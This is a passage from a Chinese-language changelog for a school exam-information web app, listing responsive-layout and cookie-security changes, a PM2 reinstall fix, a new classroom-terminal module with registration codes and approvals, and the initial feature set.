- **分级存储控制**：`essential` 始终允许，其他类别（`functional`、`analytics`、`preferences`）按用户 Cookie 同意偏好授权

### 响应式设计优化

#### 新增 `src/hooks/useResponsive.ts`
- 提供 `device`（`mobile` / `tablet` / `desktop`）、`isMobile`、`isTablet`、`isDesktop`、`width`、`height` 状态
- 断点定义：mobile < 768px，tablet 768-1023px，desktop >= 1024px
- 使用 `requestAnimationFrame` 防抖，避免性能损耗
- 监听 `resize` 与 `orientationchange` 事件
- SSR 兼容（首次渲染默认 desktop）

#### 全局 CSS 响应式断点（`src/index.css`）
- **平板端（768-1023px）专属样式**：
  - 触摸区域 `min-height: 40px; min-width: 40px;`
  - 表单输入框 `font-size: 0.95rem; padding: 0.7rem 0.9rem;`
  - 标题行高 `line-height: 1.3;`
- **手机端（<768px）专属样式**：
  - 根字体 `font-size: 15px;`
  - 卡片圆角 `border-radius: 0.75rem;`
  - 标题行高 `line-height: 1.35;`
  - 表格字体 `font-size: 0.8rem;`
  - 表单输入框 `font-size: 0.95rem; padding: 0.7rem 0.85rem;`
- **小屏手机（<400px）进一步优化**：
  - 根字体 `font-size: 14px;`
  - 表单输入框紧凑内边距
- **横屏手机优化**：
  - 减小顶部内边距，最大化内容区域
  - 适配 `env(safe-area-inset-top)`
- **深色模式滚动条优化**：8px 宽度，zinc 色阶
- **移动端通用工具类**：
  - `.touch-target`（min 44×44px，iOS HIG 规范）
  - `.no-select-mobile`（禁用文本选择）
  - `.safe-bottom` / `.safe-top`（iPhone 刘海/底部横条安全区域）
- **body 全局优化**：`overflow-x: hidden` 防水平滚动
- **点击高亮移除**：`-webkit-tap-highlight-color: transparent`、`-webkit-touch-callout: none`

#### 布局组件响应式优化
- **`src/components/Layout/StudentLayout.tsx`**：
  - 紧凑移动端头部（`px-3`、`h-14`）
  - 移动端仅显示头像 + 名称的紧凑用户信息
  - `touch-target` 登出按钮
  - `safe-bottom` 页脚安全区域
  - 长文本 `truncate` 截断
- **`src/components/Layout/TeacherLayout.tsx`**：
  - 移动端侧边栏关闭按钮
  - 桌面端侧边栏底部用户信息
  - 紧凑移动端头部
  - 所有按钮添加 `touch-target`
  - `backdrop-blur-sm` 遮罩
  - `aria-label` 无障碍标签
- **`src/components/Layout/UserLayout.tsx`**：
  - 移动端较小头部（`h-14`）
  - 较小 Logo（`w-9`）
  - `safe-top` / `safe-bottom` 安全区域
  - 移动端菜单激活链接样式
  - `aria-expanded` 无障碍属性
  - 响应式页脚文本
- **`src/components/Layout/AdminLayout.tsx`**：保持现有移动端抽屉式侧边栏

#### 公共组件响应式优化
- **`src/components/Hero.tsx`**：
  - 响应式标题（移动端 `text-3xl`）
  - 响应式内边距（移动端 `py-10`）
  - 移动端较小统计卡片（`p-3`、`w-8` 图标、`text-lg` 数字）
  - 响应式 gap
- **`src/components/SearchFilterBar.tsx`**：
  - 紧凑移动端内边距（`p-3`）
  - 较小搜索图标（`w-4`）
  - 较小过滤按钮（`px-3`、`text-xs`）
  - 按钮添加 `touch-target`
  - 水平滚动优化
- **`src/components/ExamCard.tsx`**：
  - 响应式内边距（移动端 `p-4`）
  - 响应式文本大小
  - 移动端较小图标（`w-3.5`）
  - `no-select-mobile` 禁用选择
  - 长文本字段 `truncate` 截断

#### 教室端页面响应式优化
- **`src/pages/classroom/Home.tsx`**（重大重写）：
  - 从黑色科幻主题（`bg-black text-white`）统一为黑白简约风格（`bg-zinc-50 text-zinc-900`）
  - 粘性白色头部
  - 响应式内边距与文本大小
  - 按钮添加 `touch-target`
  - 网格布局：移动端 1 列 / 平板+ 2 列
  - 移动端紧凑页脚统计
  - 所有子组件（HeroBanner、StatItem、ExamCard、CountBlock、InfoRow、LoadingState、ErrorState、EmptyState）更新为 zinc 色阶
- **`src/pages/classroom/Invigilation.tsx`**（保留黑色主题）：
  - 响应式内边距与文本大小（`px-4 sm:px-6 lg:px-12`）
  - 按钮添加 `touch-target`
  - `safe-top` / `safe-bottom` 安全区域
  - 移动端较小考试选择器按钮
  - 标题 `truncate` 截断
  - 按钮添加 `aria-label` 无障碍标签

### 功能验证
- ✅ TypeScript 类型检查通过（`npx tsc --noEmit`）
- ✅ 生产构建成功（`npm run build`）
- ✅ 所有路由返回 HTTP 200（`/`、`/student/login`、`/teacher/login`、`/classroom/login`、`/admin/login`、`/school-info`）
- ✅ 所有受保护路由正确重定向到对应登录页
- ✅ StudentLayout、TeacherLayout、AdminLayout、ClassroomHome 的登出功能正确返回登录页
- ✅ 所有 Cookie 设置包含 `secure: true`

### 代码变更文件清单
- 修改：`src/utils/cookie.ts`（完整重写，添加安全措施）
- 新增：`src/utils/safeStorage.ts`（安全本地存储工具）
- 修改：`src/utils/api.ts`（7 处 setCookie 添加 `secure: true`）
- 修改：`src/store/themeStore.ts`（`secure: true`）
- 修改：`src/hooks/useCookieConsent.ts`（`secure: true`）
- 修改：`src/pages/admin/Login.tsx`（`secure: true`）
- 修改：`src/pages/student/Login.tsx`（`secure: true`）
- 修改：`src/pages/classroom/Login.tsx`（2 处 `secure: true`）
- 修改：`src/index.css`（5 个断点专属样式 + 工具类）
- 新增：`src/hooks/useResponsive.ts`（设备检测 Hook）
- 修改：`src/components/Layout/StudentLayout.tsx`（移动端适配）
- 修改：`src/components/Layout/TeacherLayout.tsx`（移动端适配）
- 修改：`src/components/Layout/UserLayout.tsx`（移动端适配）
- 修改：`src/components/Hero.tsx`（响应式）
- 修改：`src/components/SearchFilterBar.tsx`（响应式）
- 修改：`src/components/ExamCard.tsx`（响应式）
- 修改：`src/pages/classroom/Home.tsx`（主题统一 + 响应式）
- 修改：`src/pages/classroom/Invigilation.tsx`（响应式适配）

---

## [1.1.3] - 2026-06-27

### 关键修复

#### 环境重装稳定性修复
- **修复 "重装后端" / "完整重装" 进程自杀 Bug** — `pm2 stop` 在代码内部杀死当前 HTTP 请求进程，导致后续依赖安装、编译步骤全部跳过，且 PM2 进程进入 `stopped` 状态无法自恢复。改为移除 `pm2 stop`，使用独立 `spawn` 子进程延迟 2 秒重启，确保：① 全部重装步骤完整执行；② 响应日志完整返回给前端；③ 服务自动重启恢复
- **修复 PM2 `NODE_ENV=production` 导致构建失败** — PM2 设置的环境变量令 `npm install` 跳过 `devDependencies`（含 TypeScript、Vite），导致 `tsc: not found` 编译失败。在 `safeExec` 执行环境中覆盖 `NODE_ENV=""`，确保 `npm install` 完整安装所有依赖
- **修复 `CookieConsent.tsx` TypeScript 编译错误** — 缺少 `import { useState } from "react"` 导致前端构建失败，已补充导入语句
- **构建命令显式路径** — 前端构建命令改为 `./node_modules/.bin/tsc -b && ./node_modules/.bin/vite build`，避免 PATH 解析异常

#### 代码变更
- `api/src/routes/environment.ts`: 移除 `backend` 和 `all` 重装 case 中的 `pm2 stop`，改用 `spawn(…)` 延迟重启；`safeExec` 添加 `NODE_ENV: ""` 环境覆盖；`safeExec` PATH 增加 `node_modules/.bin` 路径
- `src/components/CookieConsent.tsx`: 添加 `import { useState } from "react"`

---

## [1.1.2] - 2026-06-27

### 新增功能

#### 教室端功能模块
- **教室端注册** — 使用管理员创建的注册码注册，选择教学楼，填写教室号
- **教室端登录** — 独立的教室端登录页面，支持审核状态提示
- **教室端大屏首页** — 一体机友好设计，纯黑背景，实时时间显示，自动刷新
- **监考模式页面** — 全屏考试倒计时，大字号展示，进度条，最后5分钟红色预警
- **JWT 角色区分** — 管理员和教室端使用独立 JWT token，互斥认证
- **教室分配系统** — 考试可分配多个教室，教室端仅显示被分配的考试

#### 教学楼管理
- **教学楼 CRUD** — 管理员可创建、编辑、删除教学楼
- **公开查询** — 教室端注册时可查询教学楼列表

#### 注册码管理
- **注册码生成** — 支持批量生成（1-50个），XXXX-XXXX 格式，点击复制
- **注册码状态管理** — 按使用/未使用状态筛选，删除未使用的注册码

#### 教室端账号管理
- **审核流程** — 注册申请需管理员审核（通过/驳回）
- **状态筛选** — 按待审核/已通过/已驳回筛选教室端账号
- **待审核计数** — 侧边栏实时显示待审核数量徽标

### 优化改进
- **导航栏布局** — 公众首页导航栏全宽撑满，Logo 最左、菜单项最右
- **教室端入口** — 公众首页和后台侧边栏均添加教室端入口链接
- **代码清理** — 删除未使用的代码文件（exams.ts、useTheme.ts、Empty.tsx、react.svg）
- **依赖瘦身** — 移除未使用的 npm 依赖（lucide-react、ssh2 等）
- **导出精简** — 移除 date.ts 和 auth.ts 中未使用的导出

### 数据库变更
- 新增 4 张表：`buildings`、`registration_codes`、`classrooms`、`exam_classrooms`
- classrooms 表新增 `status` ENUM 字段（pending/approved/rejected）
- 注册码表使用应用层约束避免循环外键

### 技术细节
- 新增 4 个后端路由：buildings、registration-codes、classrooms、classroom
- 新增 3 个前端页面：教室端登录、注册、首页
- 新增 3 个后台页面：教学楼管理、注册码管理、教室端账号管理
- 新增 classroomAuthStore（Zustand）、ClassroomProtectedRoute
- 前端构建缓存优化（vite.config.ts 注入构建时间戳）

---

## [1.0.5] - 2025

### 初始版本
- 考试信息前台展示（首页、搜索/状态筛选）
- 后台考试管理（发布/编辑/删除）
- 公告管理（发布/编辑/删除/置顶）
- 管理员登录/密码修改
- 系统设置（管理员个人信息、学校信息）
- 服务器监控页面
- 环境检测与一键更新
- 可视化日期时间选择器
- 安装向导（一键部署 + 数据库初始化）
- 数学函数生成 SVG 图标
- 黑白简约风格 + 深色/浅色模式
- 响应式布局
- PM2 进程守护 + Nginx 反向代理
